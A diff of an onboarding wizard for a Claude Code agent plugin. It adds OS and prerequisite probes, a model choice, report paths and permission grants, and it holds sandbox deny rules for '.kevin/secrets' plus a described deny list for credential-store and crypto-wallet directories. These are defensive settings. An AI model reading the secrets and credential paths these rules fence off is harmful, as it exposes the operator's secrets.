@@ -13,16 +13,31 @@ Guided onboarding. Follow the steps in order — each step's answers become defa
 
 ## Step 0 — Resolve HOME and check idempotency
 
-Kevin's home is **the current working directory** — whatever directory the user launched `claude` from. No home-picker prompt. Power users can override by setting `KEVIN_HOME` in their shell rc.
+Kevin's home is **the current working directory** — whatever directory the user launched `claude` from (override via `KEVIN_HOME` in the shell rc). The convention for a fresh home is **`~/Documents/Agents/<AgentName>`**: the brain lives in Documents as a browsable vault, and code repos live flat in a separate tree (e.g. `~/Developer/<Org>/<repo>`) — never inside the home. Init scaffolds into cwd only, so when cwd isn't where the home should live, the fix is to relaunch from the right directory, not to scaffold remotely.
 
 ```bash
-HOME_DIR="${KEVIN_HOME:-$PWD}"
+HOME_DIR="${KEVIN_HOME:-${AGENT_HOME:-$PWD}}"
 if [ -f "$HOME_DIR/SOUL.md" ]; then
   echo "ALREADY_INITIALIZED at $HOME_DIR"
+elif git -C "$HOME_DIR" rev-parse --is-inside-work-tree >/dev/null 2>&1; then
+  echo "CWD_IS_A_REPO at $HOME_DIR"
 fi
+[ -d "$HOME/Library/Mobile Documents/com~apple~CloudDocs/Documents" ] && echo "ICLOUD_DOCUMENTS_SYNC=on"
 ```
 
 `SOUL.md` is Kevin's idempotency marker — its filename is unique to the plugin (unlike `CLAUDE.md`, which may pre-exist in any Claude Code project the plugin gets installed into).
+
+Act on the probes before anything else:
+
+- **`CWD_IS_A_REPO`** — cwd is inside a git work tree that isn't a Kevin home: almost certainly a code repo, and scaffolding a brain into a repo pollutes it (SOUL.md, knowledge/, `.kevin/` all land in the working tree). `AskUserQuestion`:
+
+  > **This looks like a code repo, not a home for Kevin's brain.** You launched `claude` in `<HOME_DIR>`, which is a git repository without a Kevin scaffold. Where should the home live?
+  > - **`~/Documents/Agents/<AgentName>` (recommended)** — exit, `mkdir -p` it, relaunch `claude` there, re-run `/agent-kevin:init`
+  > - **Here anyway** — I understand the scaffold lands inside this repo
+
+  On the recommended pick, print the exact `mkdir -p ~/Documents/Agents/<AgentName> && cd ~/Documents/Agents/<AgentName> && claude` line and **STOP** — the rest of the wizard runs in the relaunched session. Only "Here anyway" continues.
+
+- **`ICLOUD_DOCUMENTS_SYNC=on`** (macOS, and only relevant when the home is under `~/Documents`) — surface a one-line FYI and continue, never warn or block: *"Heads-up: your Documents folder syncs to iCloud, so the agent's knowledge and secrets will sync with it."*
 
 **Detect the operating system.** Several later steps scaffold OS-specific content — the timezone probe (Step 4), the external-storage suggestion (Step 5c), the security deny-list (Step 7), and the `{{PLATFORM}}` line recorded in CLAUDE.md. Resolve it once here. Claude Code's Bash tool runs under Git Bash on Windows, so `uname` is available everywhere.
 
@@ -43,19 +58,52 @@ echo "KEVIN_OS=$KEVIN_OS"
 
 Carry `$KEVIN_OS` and `$PLATFORM_LABEL` through the rest of the walk.
 
-**Check prerequisites — bail early if a show-stopper is missing.** Kevin's MCP server, all three hooks, and the CLI launch via `bun`, so it's a hard requirement; `git` backs the version-controlled knowledge tree, the session git-activity context, and worktrees. `python3` is **optional but recommended** — Kevin is TypeScript-first, but some tooling and integrations still reach for Python, so having it on PATH avoids friction later. On **native Windows**, Kevin runs through **Git Bash** (the shell Claude Code uses for its Bash tool) — that's the supported Windows path and supplies the POSIX environment Kevin's commands assume; **WSL2** also works if you prefer a full Linux userland.
+**Check prerequisites — bail early if a show-stopper is missing.** Kevin's MCP server, all three hooks, and the CLI launch via `bun`, so it's a hard requirement; `git` backs the version-controlled knowledge tree, the session git-activity context, and worktrees. `python3` is **optional but recommended** — Kevin is TypeScript-first, but some tooling and integrations still reach for Python, so having it on PATH avoids friction later. On macOS both `git` and `python3` come with the Xcode Command Line Tools (`xcode-select --install`); neither needs Homebrew. `gh` is **conditional**: nothing else uses it, but every GitHub-pack tool shells out to it — including `github_fast_forward`, which is what keeps the code checkouts current during `/agent-kevin:sync`. It is not bundled with Claude Code or this plugin, so on macOS it means Homebrew (`brew install gh`). Probing it here turns a mid-session throw into a note the operator can act on before they tick the pack. `poppler` is **optional** as well: the Read tool renders PDF pages through its `pdftoppm` binary, so install it (macOS `brew install poppler`, Linux `poppler-utils`) if you want Kevin to read PDF files. On **native Windows**, Kevin runs through **Git Bash** (the shell Claude Code uses for its Bash tool) — that's the supported Windows path and supplies the POSIX environment Kevin's commands assume; **WSL2** also works if you prefer a full Linux userland.
 
 ```bash
+# Probe FUNCTIONALLY, never with `command -v`. On macOS /usr/bin/git and
+# /usr/bin/python3 are xcode-select shims — one shared 118KB binary hard-linked
+# under ~78 tool names — that sit on PATH whether or not the Command Line Tools
+# are installed. `command -v git` therefore succeeds on a machine that has no
+# git, and the failure only appears later when something tries to use it.
+# Verified 2026-08-05: with the developer dir unresolvable, `command -v git`
+# passes while `git --version` exits 1.
 MISSING=()
-command -v bun >/dev/null 2>&1 || MISSING+=("bun  — runs Kevin's MCP server, hooks, and CLI · https://bun.sh")
-command -v git >/dev/null 2>&1 || MISSING+=("git  — version-controls your knowledge tree, powers worktrees · https://git-scm.com")
-command -v python3 >/dev/null 2>&1 || echo "NOTE: python3 not found (optional but recommended — occasionally needed for tooling/interop even though Kevin is TypeScript-first)."
+bun --version >/dev/null 2>&1 || MISSING+=("bun  — runs Kevin's MCP server, hooks, and CLI · https://bun.sh")
+git --version >/dev/null 2>&1 || MISSING+=("git  — version-controls your knowledge tree, powers worktrees · https://git-scm.com")
+python3 --version >/dev/null 2>&1 || echo "NOTE: python3 not found (optional but recommended — occasionally needed for tooling/interop even though Kevin is TypeScript-first)."
+command -v pdftoppm >/dev/null 2>&1 || echo "NOTE: pdftoppm not found (optional — install poppler so the Read tool can render PDFs: macOS 'brew install poppler', Linux 'poppler-utils')."
+command -v gh >/dev/null 2>&1 || echo "NOTE: gh not found (needed ONLY if you activate the GitHub pack at Step 8 — that pack's tools, including the sync code-refresh, shell out to it: macOS 'brew install gh', https://cli.github.com)."
+
+# macOS only: name the RIGHT remedy. A failing git on a Mac is almost never a
+# missing git download — it's absent Command Line Tools, and the fix is
+# `xcode-select --install`, not a trip to git-scm.com.
+if [ "$KEVIN_OS" = "macos" ] && ! xcode-select -p >/dev/null 2>&1; then
+  echo "XCODE_CLT_MISSING"
+fi
+
+# Homebrew is NOT a Kevin dependency — nothing here ever calls it. It's only the
+# install path for gh/poppler on macOS, so it's worth a line just when one of
+# those is actually missing and the operator would otherwise hit a second wall.
+if [ "$KEVIN_OS" = "macos" ] && ! command -v brew >/dev/null 2>&1; then
+  echo "NOTE: Homebrew not found — needed only to install gh/poppler if you want them (https://brew.sh)."
+fi
 printf 'MISSING: %s\n' "${MISSING[@]}"
 ```
 
 Act on the result **before** anything else:
 
 - **Native Windows (`$KEVIN_OS` = `windows`)** — supported; do **not** stop. Surface a one-line FYI and continue: *"Running on native Windows via Git Bash — the supported Windows path. (Prefer a full Linux userland? WSL2 works too.)"* The OS-specific steps below (timezone probe, external-storage suggestion, security deny-list, the `{{PLATFORM}}` label) already branch on `windows`, so the scaffold is shaped correctly. Heads-up worth surfacing once: a few pack-gated skills assume tools Git Bash lacks (e.g. `jq`), and the OS sandbox is unavailable on Windows — neither blocks the core setup.
+
+- **`XCODE_CLT_MISSING`** — the Xcode Command Line Tools aren't installed, which on a Mac is the usual root cause behind a failing `git` (and `python3`). Surface this **instead of** the generic git line when both fired, since `xcode-select --install` fixes it and a git-scm.com download is the wrong advice:
+
+  > 🛑 **Xcode Command Line Tools aren't installed.** On macOS this is what provides `git` and `python3`. Run this, click through the installer (~10 min), then re-run `/agent-kevin:init`:
+  >
+  > ```bash
+  > xcode-select --install
+  > ```
+
+  **STOP** if `git` was also in `MISSING`. If git resolved from elsewhere (Homebrew, a standalone install) this is informational — mention it once and continue.
 
 - **`MISSING` non-empty** — print the block below verbatim (one line per missing tool) and **STOP**:
 
@@ -65,7 +113,7 @@ Act on the result **before** anything else:
   >
   > Install them, then re-run `/agent-kevin:init` — it's idempotent and picks up where you left off.
 
-- **Nothing missing** — surface the optional `NOTE` (if any) as a one-line FYI and continue.
+- **Nothing missing** — surface any optional `NOTE`s (if present) as one-line FYIs and continue.
 
 If `ALREADY_INITIALIZED`, `AskUserQuestion` with an explicit enumeration of what re-run does. Surface the full write list so the operator knows what they're agreeing to — Step 0's prior wording understated the destructive surface and operators reasonably trusted it.
 
@@ -107,7 +155,7 @@ Then below the banner, plain prose (no leading whitespace, no numbered lists —
 >
 > ❓ Kevin's character, accept or refine
 > ❓ Kevin's role, accept or refine
-> ❓ Your basics: name, timezone
+> ❓ Your basics: name, home timezone
 > ❓ Optional: paste any URLs about you (blog, LinkedIn, GitHub, etc.)
 > ❓ Optional: paste a path or URL for your avatar (gets linked into knowledge/user/profile.md)
 > ❓ Optional: should knowledge/ and projects/ live somewhere outside the home directory?
@@ -160,7 +208,7 @@ Adjust the staged IDENTITY's `## Core Role` to match. Leave `## Operational Patt
 
 ---
 
-## Step 4 — Your basics (name + timezone)
+## Step 4 — Your basics (name + home timezone)
 
 Infer defaults first:
 
@@ -178,7 +226,7 @@ esac
 `AskUserQuestion` (batched):
 
 > 1. **Your name** — what should Kevin call you? (Default: `<NAME_DEFAULT>`)
-> 2. **Your timezone** — IANA name like `America/New_York`. (System looks like: `<TZ_IANA>`)
+> 2. **Your home timezone** — IANA name like `America/New_York`, where you're normally based. (System looks like: `<TZ_IANA>`)
 
 When `TZ_IANA` is blank (Windows, or the probe found nothing), drop the "System looks like" hint and prompt for the IANA name outright with an example, e.g. *"IANA name like `Asia/Kuala_Lumpur` — couldn't auto-detect, so please type yours."*
 
@@ -206,17 +254,17 @@ done
 
 Plain chat (NOT `AskUserQuestion` — the answer is a freeform absolute path):
 
-> **Absolute path to your primary codebase?** Optional — reply `skip` if Kevin isn't for coding, or set it later in `<HOME>/.claude/settings.local.json` under `env.KEVIN_CODE_PATH`. Inferred default: `<CODE_DEFAULT>` (blank if nothing obvious found).
+> **Absolute path to your primary codebase?** Optional — reply `skip` if Kevin isn't for coding, or set it later in `<HOME>/.claude/settings.local.json` under `env.AGENT_CODE_PATH`. Inferred default: `<CODE_DEFAULT>` (blank if nothing obvious found).
 
 Parse the user's next message:
 
-- `skip` (case-insensitive) → stage `KEVIN_CODE_PATH=""` and continue.
+- `skip` (case-insensitive) → stage `AGENT_CODE_PATH=""` and continue.
 - Otherwise → verify the path exists (`test -d "$ANSWER"`). If it doesn't, warn and re-ask once.
 
 Stage the resolved absolute path for two writes in Step 7:
 
 1. USER.md → "Where Things Live → Primary codebase" entry.
-2. `.claude/settings.local.json` → `env.KEVIN_CODE_PATH`, with `env.KEVIN_GIT_REPOS` derived to the same path so the codebase's recent git activity shows up in session context from day one.
+2. `.claude/settings.local.json` → `env.AGENT_CODE_PATH`, with `env.AGENT_GIT_REPOS` derived to the same path so the codebase's recent git activity shows up in session context from day one.
 
 ---
 
@@ -226,7 +274,7 @@ Freeform multi-URL input. **Do NOT use `AskUserQuestion` here** — its `Other` 
 
 Emit this as a regular assistant message and wait for the user's next turn:
 
-> **Optional — paste any URLs about you** (newline- or space-separated). Examples: personal site/blog, LinkedIn, GitHub, X/Mastodon, podcast page, talks. Kevin fetches each, synthesises durable facts into `knowledge/user/*.md`, and cites the source URL inline.
+> **Optional — paste any URLs about you** (newline- or space-separated). Examples: personal site/blog, LinkedIn, GitHub, X/Mastodon, podcast page, talks. Kevin fetches each, synthesises durable facts into `knowledge/user/*.md`, and cites the source URL inline. (LinkedIn and X block bots — for those Kevin asks for a quick export instead of fetching.)
 >
 > Reply with the URLs, or say `skip` to continue with empty stubs.
 
@@ -234,7 +282,19 @@ Parse the user's next message: split on whitespace + newlines, keep tokens that 
 
 If blank → skip to Step 6.
 
-Otherwise, parse URLs (split on whitespace + newlines, filter to anything that looks like a URL). For each, `WebFetch` and synthesise into staged content:
+Otherwise, parse URLs (split on whitespace + newlines, filter to anything that looks like a URL), then partition them:
+
+**Authwalled domains — never fetch.** `linkedin.com`, `x.com`/`twitter.com`, `facebook.com`, `instagram.com` serve a login wall or bot-block to anonymous requests, so a fetch is a guaranteed error — don't attempt it. If any pasted URL matches, ask for an export instead (plain chat, one message covering all matches):
+
+> **LinkedIn/X block automated reads** — but your own export is richer data anyway.
+> - LinkedIn: open your profile → **More → Save to PDF**, then paste the file path here.
+> - Other authwalled sites: paste the relevant text directly.
+>
+> Reply with the path/text, or `skip` to drop those URLs.
+
+`Read` the provided file (PDFs work) or take the pasted text, and synthesise it through the same facet routing below, citing the original profile URL as the source. On `skip`, note it in the log and continue.
+
+For every remaining URL, `WebFetch` and synthesise into staged content:
 
 - Bio / about / personal site → `profile.md` (bio, location, work focus) + `interests.md` (topics they write about) + light tone hints → `preferences.md`
 - Professional / LinkedIn-style → `career.md` (roles, companies, dates) + `skills.md`
@@ -272,7 +332,7 @@ Stage `Avatar: knowledge/user/assets/avatar.<ext>` into the eventual `knowledge/
 
 `AskUserQuestion`:
 
-> **Where should `knowledge/` and `projects/` live?** Default keeps them inside your agent home. Override if you want to:
+> **Where should `knowledge/`, `projects/`, and `reports/` live?** Default keeps them inside your agent home. Override if you want to:
 > - sync via a cloud-synced folder (`<CLOUD_EXAMPLE>` — a path outside the home)
 > - keep them in a separate git repo
 > - share `projects/` across multiple Kevin homes
@@ -282,17 +342,22 @@ Fill `<CLOUD_EXAMPLE>` from `$KEVIN_OS`: iCloud Drive on `macos`, OneDrive (`~/O
 > - Default: inside `<HOME>` (recommended)
 > - Specify custom paths
 
-If the user picks "Specify", ask for two paths (plain chat or two follow-up `AskUserQuestion` rounds): `KEVIN_KNOWLEDGE` and `KEVIN_PROJECTS`. Tilde-expand. Validate the paths look reasonable. Stage both env-var values for the eventual `.zshrc` reminder in Step 9.
+If the user picks "Specify", ask for three paths (plain chat or follow-up `AskUserQuestion` rounds): `AGENT_KNOWLEDGE`, `AGENT_PROJECTS`, and `AGENT_REPORTS`. Tilde-expand. Validate the paths look reasonable. Stage all three env-var values for the eventual `.zshrc` reminder in Step 9.
+
+`AGENT_REPORTS` is where the reporting skills (briefings, radar, roadmap, plans) write their outputs. Default `$HOME_DIR/reports`. Linked from `knowledge/index.md` via `reports/index.md` as a 3rd-degree context network.
 
 **If either path is OUTSIDE the agent home directory**, Step 7's `.claude/settings.json` write must also append `permissions.allow` entries (and `sandbox.filesystem.allowWrite` if the user's sandbox is enabled, see below) so Claude Code can read/write there without prompting on every operation. Specifically add to `permissions.allow`:
 
 ```json
-"Read(<KEVIN_KNOWLEDGE>/**)",
-"Write(<KEVIN_KNOWLEDGE>/**)",
-"Edit(<KEVIN_KNOWLEDGE>/**)",
-"Read(<KEVIN_PROJECTS>/**)",
-"Write(<KEVIN_PROJECTS>/**)",
-"Edit(<KEVIN_PROJECTS>/**)"
+"Read(<AGENT_KNOWLEDGE>/**)",
+"Write(<AGENT_KNOWLEDGE>/**)",
+"Edit(<AGENT_KNOWLEDGE>/**)",
+"Read(<AGENT_PROJECTS>/**)",
+"Write(<AGENT_PROJECTS>/**)",
+"Edit(<AGENT_PROJECTS>/**)",
+"Read(<AGENT_REPORTS>/**)",
+"Write(<AGENT_REPORTS>/**)",
+"Edit(<AGENT_REPORTS>/**)"
 ```
 
 And if `~/.claude/settings.json` has a `sandbox.filesystem.allowWrite` array, mirror those two paths into it too — otherwise Claude Code's sandbox blocks the writes regardless of `permissions.allow`.
@@ -348,18 +413,31 @@ Parse the next message: if `looks good` → keep the proposal; if edits/addition
 
 ---
 
+## Step 6c — Model
+
+Kevin's project settings pin which Claude model powers this home. `AskUserQuestion`:
+
+> **Which model should Kevin run on?**
+> - **Fable (Recommended)** — Anthropic's most capable tier; best judgment for an agent trusted with your knowledge base.
+> - **Opus** — one tier down; stretches a usage-limited plan further.
+
+Stage the answer as `KEVIN_MODEL` — the literal string `fable` or `opus` — for the settings scaffold in Step 7. If the operator picks "Other" and types a model string, stage that verbatim.
+
+---
+
 ## Step 7 — Write the scaffold
 
 Create the directory tree:
 
 ```bash
-# Resolve knowledge + projects paths from Step 5c. Default = under $HOME_DIR.
-KNOWLEDGE_ROOT="${KEVIN_KNOWLEDGE:-$HOME_DIR/knowledge}"
-PROJECTS_ROOT="${KEVIN_PROJECTS:-$HOME_DIR/projects}"
+# Resolve knowledge + projects + reports paths from Step 5c. Default = under $HOME_DIR.
+KNOWLEDGE_ROOT="${KEVIN_KNOWLEDGE:-${AGENT_KNOWLEDGE:-$HOME_DIR/knowledge}}"
+PROJECTS_ROOT="${KEVIN_PROJECTS:-${AGENT_PROJECTS:-$HOME_DIR/projects}}"
+REPORTS_ROOT="${KEVIN_REPORTS:-${AGENT_REPORTS:-$HOME_DIR/reports}}"
 
 mkdir -p "$HOME_DIR"/.kevin/{config,logs} "$HOME_DIR"/.claude/assets
 mkdir -p "$KNOWLEDGE_ROOT"/{user/assets,concepts,memory,raw/{sessions,user,inbox,archive/inbox}}
-mkdir -p "$PROJECTS_ROOT"
+mkdir -p "$PROJECTS_ROOT" "$REPORTS_ROOT"
 ```
 
 **Record the template baseline.** Write `$HOME_DIR/.kevin/version.json` stamping the plugin version this home was scaffolded from. This is the anchor the SessionStart banner + dashboard use to detect pending HOME migrations, and the "from" point `/agent-kevin:upgrade` reconciles from. A fresh home equals the installed version, so it starts `current` (never falsely flagged). **Skip the write if the file already exists** (a re-init must not reset an upgrade-tracked baseline).
@@ -484,22 +562,23 @@ Write project settings so the plugin auto-loads on subsequent launches AND the *
 
 - `$HOME_DIR/.claude/settings.json` ← JSON below, with `<PLUGIN_PATH>` substituted with the absolute value of `${CLAUDE_PLUGIN_ROOT}`.
 
-**`plansDirectory` — unify plan-mode with reports.** Claude Code writes plan-mode artefacts to the path in `plansDirectory` (default `./.claude/plans`). Kevin's `self-review` skill also writes code-change plans under `<HOME>/reports/plans/`, so we point the harness at the same folder — one home for every plan. The value is `./reports/plans` (relative to the project root, which is `$HOME_DIR`). **Preserve any pre-existing value**: if the project `settings.json` already has a `plansDirectory`, omit the key from the scaffold and let the deep-merge below keep the operator's choice. (Note: `self-review`'s age-sweep filters to its own plans by frontmatter `skill: self-review`, so raw plan-mode dumps sharing the folder are ignored — see that skill.)
+**`plansDirectory` — unify plan-mode with reports.** Claude Code writes plan-mode artefacts to the path in `plansDirectory` (default `./.claude/plans`). Kevin's `self-review` skill also writes code-change plans under `<REPORTS_ROOT>/plans/`, so we point the harness at the same folder — one home for every plan. Compute it from the reports path resolved in Step 7: `./reports/plans` when `REPORTS_ROOT` is the default under `$HOME_DIR`, else the absolute `<REPORTS_ROOT>/plans`. **Preserve any pre-existing value**: if the project `settings.json` already has a `plansDirectory`, omit the key from the scaffold and let the deep-merge below keep the operator's choice. (Note: `self-review`'s age-sweep filters to its own plans by frontmatter `skill: self-review`, so raw plan-mode dumps sharing the folder are ignored — see that skill.)
 
-**Fill hardening gaps the operator's user-global settings don't cover.** Kevin ships a baseline of security + quality defaults (denies, sandbox, effort/model, traffic kill, retention, render, Haiku-tier remap). Most operators won't have these in their user-global `~/.claude/settings.json` — for them, init must write the baseline into project settings so the protection is actually in effect. Operators who *do* already have these globally shouldn't get the same keys duplicated into the project — global already covers them, and re-writing them in project is redundant churn.
+**Fill hardening gaps the operator's user-global settings don't cover.** Kevin ships a baseline of security + quality defaults (denies, sandbox, effort, traffic kill, retention, render, Haiku-tier remap). Most operators won't have these in their user-global `~/.claude/settings.json` — for them, init must write the baseline into project settings so the protection is actually in effect. Operators who *do* already have these globally shouldn't get the same keys duplicated into the project — global already covers them, and re-writing them in project is redundant churn.
 
 **Logic: gap-fill, not mirror.** Before writing the scaffold, `Read` `~/.claude/settings.json` (treat as empty `{}` if absent). For each baseline key below, check whether the operator already has it globally. If global covers it, **omit the key from the project scaffold** — inheritance handles it. If global does not cover it, **write the baseline value into the project scaffold**. Each `env.*` key is gap-filled independently; if all three are covered globally, omit the entire `env` block rather than writing an empty `{}`.
 
 | Project-scaffold key | Baseline value to write when global is missing it | "Already covered" test against global |
 |---|---|---|
 | `cleanupPeriodDays` | `99999` | Any non-empty `cleanupPeriodDays` set globally |
-| `model` | `"opus[1m]"` | Any non-empty `model` set globally |
 | `effortLevel` | `"high"` | Any non-empty `effortLevel` set globally |
 | `env.CLAUDE_CODE_NO_FLICKER` | `"1"` | Global `env.CLAUDE_CODE_NO_FLICKER` set to any truthy string |
 | `env.CLAUDE_CODE_DISABLE_NONESSENTIAL_TRAFFIC` | `"1"` | Global `env.CLAUDE_CODE_DISABLE_NONESSENTIAL_TRAFFIC` set to any truthy string |
 | `env.ANTHROPIC_DEFAULT_HAIKU_MODEL` | `"claude-sonnet-4-6"` | Any non-empty `env.ANTHROPIC_DEFAULT_HAIKU_MODEL` set globally |
 | `permissions.deny` | The full deny list below | Global `permissions.deny` is non-empty (any deny suggests the operator is curating their own — don't fight it) |
 | `sandbox` | The full sandbox block below | Global `sandbox.enabled === true` (sandbox is binary — if globally enabled, project doesn't need its own) |
+
+**`model` is not gap-filled.** It carries the operator's explicit Step 6c answer (`"fable"` or `"opus"`) and is always written to the project scaffold — an explicit wizard choice outranks the global setting and, on re-init, the prior project value.
 
 Baseline `permissions.deny` to write when global doesn't already have a deny list. It has a **cross-platform core** plus an **OS-specific tail** (credential store + crypto-wallet dirs, which live in different places per OS). Concatenate the core with the tail selected by `$KEVIN_OS` from Step 0 — never ship the macOS `~/Library/...` paths on a Windows/Linux/WSL home, where they're dead entries that protect nothing. (On native Windows, `$KEVIN_OS` is `windows` and the Windows `~/AppData/...` tail below applies.)
 
@@ -602,7 +681,8 @@ Baseline `sandbox` block to write when global `sandbox.enabled !== true`:
   "autoAllowBashIfSandboxed": true,
   "allowUnsandboxedCommands": false,
   "filesystem": {
-    "denyRead": [".kevin/secrets"]
+    "denyRead": [".kevin/secrets"],
+    "allowWrite": "<[CODE_ROOT] when the code tree is outside the home — see below; omit the key otherwise>"
   },
   "credentials": {
     "files": [{ "path": ".kevin/secrets", "mode": "deny" }]
@@ -632,12 +712,30 @@ unsetting) on Claude Code v2.1.187+, and is ignored on older versions. Both the 
 and sandbox layers are needed. (Sandbox is unavailable on native Windows — there the
 Read-tool deny is the only layer; flag that secrets aren't OS-protected on Windows.)
 
+**Reaching the code tree when it lives outside the home.** Under the convention the home is a standalone vault and repos live in a separate tree, so a session launched in the home reaches code across a directory boundary. Two grants make that work, and both are needed — they cover different tools:
+
+```bash
+CODE_ROOT=""
+case "$AGENT_CODE_PATH" in
+  "") ;;                                  # no code path — skip both grants
+  "$HOME_DIR"/*) ;;                       # legacy nested layout — cwd already covers it
+  *) CODE_ROOT=$(dirname "$AGENT_CODE_PATH") ;;
+esac
+```
+
+When `CODE_ROOT` is non-empty, add both to the scaffold:
+
+- `permissions.additionalDirectories: ["<CODE_ROOT>"]` — the Read/Edit/Write tools use the permission system, not the sandbox.
+- `sandbox.filesystem.allowWrite: ["<CODE_ROOT>"]` — sandboxed Bash writes only to cwd + session temp by default, so without this `git commit`, package installs, and test runs inside a repo all fail.
+
+**Grant the code root, not the single repo.** Sibling worktrees live beside the main checkout, and an operator who splits their home's git dir (`git init --separate-git-dir`, so the vault holds only a `.git` pointer) keeps the git internals in that same tree — narrowing the path to one repo silently breaks `git add`/`git commit` on the agent's own knowledge. This grant restores exactly what a nested layout gave implicitly (everything under cwd was writable); it doesn't widen beyond it. Mention it in one line during Step 9's summary so the operator knows the code tree is writable.
+
 **Do not** touch global keys outside this baseline (`hooks`, `statusLine`, `theme`, `verbose`, other `env.*` entries, other `permissions.allow` entries, `enabledPlugins`) — those are operator-personal, not project-security. Hooks especially: plugin hooks come from `hooks/hooks.json` once registered; mirroring global hooks here would double-fire.
 
 **Critical — never overwrite an existing project `settings.json`.** If `$HOME_DIR/.claude/settings.json` already exists (re-init, or the home was a pre-existing project), `Read` it first and **deep-merge** the scaffold into it. The merged JSON is what gets written back. Rules:
 
-- **Scalars** (`model`, `effortLevel`, `cleanupPeriodDays`, `plansDirectory`, `$schema`, `env.*` string values): existing project value wins. Skip the key when merging — don't replace.
-- **Arrays** (`permissions.allow`, `permissions.deny`, `sandbox.network.allowedDomains`, any `allowWrite`/`denyRead` arrays): union with the operator's existing entries + dedupe. `sandbox.credentials.files` is an object-array — union + dedupe by `path`. Don't reorder or remove anything they already had.
+- **Scalars** (`effortLevel`, `cleanupPeriodDays`, `plansDirectory`, `$schema`, `env.*` string values): existing project value wins. Skip the key when merging — don't replace. Exception: `model` — the Step 6c answer wins even over an existing project value (the operator just chose it this run).
+- **Arrays** (`permissions.allow`, `permissions.deny`, `permissions.additionalDirectories`, `sandbox.network.allowedDomains`, any `allowWrite`/`denyRead` arrays): union with the operator's existing entries + dedupe. `sandbox.credentials.files` is an object-array — union + dedupe by `path`. Don't reorder or remove anything they already had.
 - **Objects** (`permissions`, `sandbox`, `sandbox.network`, `enabledPlugins`, `env`, `hooks`): recurse with the same rules.
 - **`enabledPlugins`**: special case — set `"agent-kevin@agentlayer": true` even if the key already exists with a different value (the operator just ran init, so they want it enabled). Other plugin entries pass through untouched.
 - **`hooks`**: never touch — operator-owned end-to-end. The scaffold doesn't author any hooks block.
@@ -647,9 +745,9 @@ Concrete approach: `Read` the existing file (treat as `{}` if absent), build the
 ```json
 {
   "$schema": "https://json.schemastore.org/claude-code-settings.json",
-  "plansDirectory": "<\"./reports/plans\" if no existing project value, else omit and preserve>",
+  "plansDirectory": "<\"./reports/plans\" (or \"<REPORTS_ROOT>/plans\" when relocated) if no existing project value, else omit and preserve>",
   "cleanupPeriodDays": "<99999 if global doesn't set it, else omit>",
-  "model": "<\"opus[1m]\" if global doesn't set it, else omit>",
+  "model": "<the Step 6c answer: \"fable\" or \"opus\" — always written>",
   "effortLevel": "<\"high\" if global doesn't set it, else omit>",
   "env": {
     "CLAUDE_CODE_NO_FLICKER": "<\"1\" if global doesn't set it, else omit this key>",
@@ -662,6 +760,7 @@ Concrete approach: `Read` the existing file (treat as `{}` if absent), build the
   },
   "permissions": {
     "deny": "<full baseline deny list above if global has no permissions.deny, else omit>",
+    "additionalDirectories": "<[CODE_ROOT] when the code tree is outside the home — see above; omit the key otherwise>",
     "allow": [
       "Bash(cat *)",
       "Bash(date)",
@@ -705,6 +804,7 @@ Concrete approach: `Read` the existing file (treat as `{}` if absent), build the
       "Skill(agent-kevin:permission-check)",
       "Skill(agent-kevin:plan-spec)",
       "Skill(agent-kevin:release)",
+      "Skill(agent-kevin:roadmap)",
       "Skill(agent-kevin:setup-worktree)",
       "Skill(agent-kevin:simple-simplify)",
       "Skill(agent-kevin:sync)",
@@ -729,9 +829,9 @@ Concrete approach: `Read` the existing file (treat as `{}` if absent), build the
 | SEO-gated | `serpapi_search`, `open_page_rank`, `gsc_*`, `page_speed_*`, `google_auth` | configure-skills A.2a (SEO walk) |
 | Browser-gated | `web_search`, `browser_*` | configure-skills A.2b (Browser walk) |
 | Database-gated | `database_list`, `database_query`, `database_schema`, `database_fork` | configure-skills A.2c (Database walk) |
-| GitHub-gated | `github_pr_*`, `github_run_*`, `github_issue_*` | configure-skills A.2d (GitHub walk) |
+| GitHub-gated | `github_pr_*`, `github_run_*`, `github_issue_*`, `github_fast_forward` | configure-skills A.2d (GitHub walk) |
 
-The allow list also carries eleven **skill** grants. Skills register regardless of permissions — the grant only suppresses the confirm prompt on model invocation (whether Kevin auto-fires the skill directly or one skill invokes another via the Skill tool). `Skill(agent-kevin:dashboard)`, `Skill(agent-kevin:where-am-i)`, `Skill(agent-kevin:humanizer)`, `Skill(agent-kevin:mermaid)`, `Skill(agent-kevin:permission-check)`, and `Skill(agent-kevin:sync)` are **active**: all are model-invocable (no `disable-model-invocation`). `dashboard` refreshes-and-opens the Agent OS dashboard on a plain "refresh the dashboard"; `where-am-i` answers "where am I" directly and is also invoked by `dashboard` and `sync` to freshen the session radar (one source of truth for the radar); `humanizer` fires when Kevin is asked to strip AI-writing tells from a draft; `mermaid` fires when Kevin authors or edits a Mermaid diagram, validating it before review; `permission-check` fires when the user pastes a permission-dialog screenshot from another session and asks what it means or whether to allow it; `sync` runs the full state refresh (compile → lint → flywheel → briefing → dashboards) and is chained by `upgrade` after a HOME migration. `Skill(agent-kevin:setup-worktree)`, `Skill(agent-kevin:plan-spec)`, `Skill(agent-kevin:simple-simplify)`, `Skill(agent-kevin:upgrade)`, and `Skill(agent-kevin:release)` are **latent**: all currently set `disable-model-invocation` (slash-only — `/plan-spec`, `/simple-simplify`, `/upgrade`, `/release`), so the grant does nothing until that flag is dropped; they're kept here so the slash invocation never prompts. `upgrade` applies pending HOME migrations after a `/plugin update`; `release` (producer-only) cuts a versioned release + CHANGELOG entry.
+The allow list also carries twelve **skill** grants. Skills register regardless of permissions — the grant only suppresses the confirm prompt on model invocation (whether Kevin auto-fires the skill directly or one skill invokes another via the Skill tool). `Skill(agent-kevin:dashboard)`, `Skill(agent-kevin:where-am-i)`, `Skill(agent-kevin:humanizer)`, `Skill(agent-kevin:mermaid)`, `Skill(agent-kevin:permission-check)`, `Skill(agent-kevin:roadmap)`, and `Skill(agent-kevin:sync)` are **active**: all are model-invocable (no `disable-model-invocation`). `dashboard` refreshes-and-opens the Agent OS dashboard on a plain "refresh the dashboard"; `where-am-i` answers "where am I" directly and is also invoked by `dashboard` and `sync` to freshen the session radar (one source of truth for the radar); `humanizer` fires when Kevin is asked to strip AI-writing tells from a draft; `mermaid` fires when Kevin authors or edits a Mermaid diagram, validating it before review; `permission-check` fires when the user pastes a permission-dialog screenshot from another session and asks what it means or whether to allow it; `roadmap` fires when the user asks for a roadmap or plan-on-a-page, interviewing for the frame before rendering; `sync` runs the full state refresh (compile → lint → flywheel → briefing → dashboards) and is chained by `upgrade` after a HOME migration. `Skill(agent-kevin:setup-worktree)`, `Skill(agent-kevin:plan-spec)`, `Skill(agent-kevin:simple-simplify)`, 